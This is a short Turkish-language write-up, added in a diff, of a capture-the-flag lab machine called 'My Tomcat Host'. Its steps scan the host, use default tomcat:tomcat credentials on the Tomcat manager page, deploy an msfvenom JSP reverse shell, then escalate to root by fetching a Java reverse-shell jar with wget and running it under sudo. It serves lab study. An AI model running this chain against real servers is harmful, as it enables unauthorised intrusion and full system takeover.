@@ -1,0 +1,12 @@
+MY TOMCAT HOST MAKİNE ÇÖZÜMÜ
+1 - netdiscover -i eth0 ile IP adresi 192.168.2.134 bulunur.
+2 - nikto -h 192.168.2.134:8080
+3 - http://192.168.2.34/manager/html nikto ile tomcat:tomcat bulundu.
+4 - msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.128 LPORT=4444 -f war -o shell.war
+5 - curl -v http://192.168.2.134:8080/shell/
+6 - export TERM=xterm, SHELL=/bin/bash script -q /dev/null
+7 - sudo -l
+8 - msfvenom -p java/reverse_shell_tcp LHOST=192.168.2.128 LPORT=4445 -f jar -o root.jar
+9 - service apache2 start, cp root.jar /var/www/html
+10 - wget http://192.168.2.128/root.jar, chmod +x jar
+11 - sudo java -jar root.jar
